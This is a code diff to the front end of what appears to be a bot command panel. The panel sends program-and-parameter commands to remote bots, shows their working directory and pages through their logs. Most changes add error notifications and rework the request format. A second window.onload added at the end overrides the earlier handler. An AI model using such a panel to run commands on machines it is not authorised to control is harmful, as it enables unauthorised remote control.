@@ -23,6 +23,7 @@ async function fetchCWD() {
     const cwdDisplay = document.getElementById("cwd-display");
     const botId = document.getElementById("client-id").value;
     if (!botId) {
+        showNotification(`Not bot selected.`, 'error');
         cwdDisplay.textContent = "No bot selected $";
         return;
     }
@@ -33,10 +34,12 @@ async function fetchCWD() {
             const data = await response.json();
             cwdDisplay.textContent = `${data.cwd} $`;
         } else {
+            showNotification(`Failed to get current directory : ${response.status} - ${response.statusText}.`, 'error');
             console.error("Failed to fetch CWD");
             cwdDisplay.textContent = "Error retrieving CWD $";
         }
     } catch (error) {
+        showNotification(`Could not get current directory ${error}.`, 'error');
         console.error("Error fetching CWD:", error);
         cwdDisplay.textContent = "Error retrieving CWD $";
     }
@@ -55,26 +58,31 @@ document.addEventListener("DOMContentLoaded", () => {
 
         const botId = document.getElementById("client-id").value;
         if (!botId) {
-            alert("Please enter a Bot ID first.");
+            showNotification('Please enter a bot ID.', 'error');
             return;
         }
 
+        // Split the command into program and parameters
+        const commandParts = command.split(" ");
+        const program = commandParts[0]; // First word is the program
+        const params = commandParts.slice(1); // Remaining words are parameters
+
         const payload = {
-            bot_id: botId,
+            bot_ids: botId, // Use "bot_ids" to match the server's expected parameter
             cmd_id: "0",
-            program: command.split(" ")[0], // First word is the program
-            params: command.split(" ").slice(1).join(" "), // Remaining words are parameters
+            program: program,
+            params: params.join(" "), // Send params as a space-separated string
             delay: 0,
-            expected_exit_code: 0,
+            expected_code: 0,
         };
 
         try {
             const response = await fetch('/api/command', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded',
+                    'Content-Type': 'application/x-www-form-urlencoded', // Use URL-encoded format
                 },
-                body: `bot_id=${encodeURIComponent(payload.bot_id)}&cmd_id=${encodeURIComponent(payload.cmd_id)}&program=${encodeURIComponent(payload.program)}&params=${encodeURIComponent(payload.params)}&delay=${encodeURIComponent(payload.delay)}&expected_code=${encodeURIComponent(payload.expected_exit_code)}`,
+                body: new URLSearchParams(payload).toString(), // Convert payload to URL-encoded string
             });
 
             if (response.ok) {
@@ -87,9 +95,11 @@ document.addEventListener("DOMContentLoaded", () => {
                 // Refresh the CWD
                 await fetchCWD();
             } else {
+                showNotification('Failed to send command.', 'error');
                 console.error("Failed to send command");
             }
         } catch (error) {
+            showNotification(`Error sending command ${error}.`, 'error');
             console.error("Error sending command:", error);
         }
     }
@@ -115,32 +125,45 @@ async function fetchBotLogs(botId, prepend = false, isRefresh = false) {
         const currentOffset = isRefresh ? refreshOffset : offset;
         const response = await fetch(`/api/botfile?id=${botId}&lines=${linesPerPage}&offset=${currentOffset}`);
         if (response.ok) {
-            const data = await response.text();
+            const data = await response.json(); // Parse the JSON response
 
-            if (prepend) {
-                // Calculate the starting line number for prepended lines
-                const startingLineNumber = offset - linesPerPage + 1;
-                // Prepend new lines to the top
-                fileContentElement.innerHTML =
-                    formatLogsWithLineNumbers(data, startingLineNumber) + fileContentElement.innerHTML;
-            } else if (isRefresh) {
-                // Replace only the most recent lines during refresh
-                const preservedContent = Array.from(fileContentElement.querySelectorAll('.log-line'))
-                    .slice(0, -linesPerPage)
-                    .map(line => line.outerHTML)
-                    .join('');
-                const existingLines = fileContentElement.querySelectorAll('.log-line').length;
-                fileContentElement.innerHTML =
-                    preservedContent + formatLogsWithLineNumbers(data, existingLines - linesPerPage + 1);
+            if (data.lines && Array.isArray(data.lines)) {
+                const logs = data.lines.join('\n'); // Combine the lines into a single string
+
+                if (logs.length <= 0) {
+                    showNotification('No lines fetched. Bot may be offline.', 'error');
+                }
+
+                if (prepend) {
+                    // Calculate the starting line number for prepended lines
+                    const startingLineNumber = offset - linesPerPage + 1;
+                    // Prepend new lines to the top
+                    fileContentElement.innerHTML =
+                        formatLogsWithLineNumbers(logs, startingLineNumber) + fileContentElement.innerHTML;
+                } else if (isRefresh) {
+                    // Replace only the most recent lines during refresh
+                    const preservedContent = Array.from(fileContentElement.querySelectorAll('.log-line'))
+                        .slice(0, -linesPerPage)
+                        .map(line => line.outerHTML)
+                        .join('');
+                    const existingLines = fileContentElement.querySelectorAll('.log-line').length;
+                    fileContentElement.innerHTML =
+                        preservedContent + formatLogsWithLineNumbers(logs, existingLines - linesPerPage + 1);
+                } else {
+                    // Replace content for initial load
+                    fileContentElement.innerHTML = formatLogsWithLineNumbers(logs, 1);
+                }
             } else {
-                // Replace content for initial load
-                fileContentElement.innerHTML = formatLogsWithLineNumbers(data, 1);
+                showNotification('No logs found in the response.', 'error');
+                fileContentElement.textContent = 'No logs found.';
             }
         } else {
             const error = await response.json();
+            showNotification(`Error getting logs: ${error.error}.`, 'error');
             fileContentElement.textContent = `Error: ${error.error}`;
         }
     } catch (err) {
+        showNotification(`Failed to fetch bot logs: ${err.message}.`, 'error');
         fileContentElement.textContent = `Error: Failed to fetch bot logs. ${err.message}`;
     }
 }
@@ -178,7 +201,7 @@ function setBotId(botId) {
 }
 
 // On page load, fetch the last `linesPerPage` lines, start the timer, and fetch the CWD
-window.onload = () => {
+window.onload = async () => {
     const botId = getQueryParam('id');
     if (botId) {
         setBotId(botId); // Populate the hidden input field with the bot ID
@@ -188,6 +211,7 @@ window.onload = () => {
         startTimer(botId); // Start the timer for regular updates
         fetchCWD(); // Fetch the current working directory
     } else {
+        showNotification('No bot ID was provided', 'error');
         document.getElementById('file-content').textContent = 'Error: No bot ID provided in the URL.';
         document.getElementById('cwd-display').textContent = 'No bot selected $';
     }
@@ -203,7 +227,7 @@ document.getElementById('load-client').addEventListener('click', () => {
         fetchBotLogs(clientId); // Get file data
         startTimer(clientId); // Auto-update file content
     } else {
-        alert('Please enter a valid Client ID.');
+        showNotification('Please enter a valid Client ID.', 'error');
     }
 });
 
@@ -219,7 +243,7 @@ function forcerefresh() {
         fetchBotLogs(botId, false, true); // Refresh the most recent lines
         countdown = 30; // Reset the countdown
     } else {
-        alert('Please enter a valid Bot ID.');
+        showNotification('Please enter a valid Bot ID.', 'error');
     }
 }
 
@@ -233,6 +257,22 @@ document.getElementById('load-more').addEventListener('click', async () => {
         await new Promise(r => setTimeout(r, 1)); // For some reason, we need to wait for just a little (1ms)
         forcerefresh(); // Allows to reset the line numbers :)
     } else {
-        alert('Please enter a valid Bot ID.');
+        showNotification('Please enter a valid Bot ID.', 'error');
     }
 });
+
+// On page load, fetch the last `linesPerPage` lines, start the timer, and fetch the CWD
+window.onload = () => {
+    const botId = getQueryParam('id');
+    if (botId) {
+        setBotId(botId); // Populate the hidden input field with the bot ID
+        offset = 0; // Reset offset for "Load More"
+        refreshOffset = 0; // Reset offset for refresh
+        fetchBotLogs(botId); // Fetch the logs for the specified bot ID
+        startTimer(botId); // Start the timer for regular updates
+        fetchCWD(); // Fetch the current working directory
+    } else {
+        document.getElementById('file-content').textContent = 'Error: No bot ID provided in the URL.';
+        document.getElementById('cwd-display').textContent = 'No bot selected $';
+    }
+};
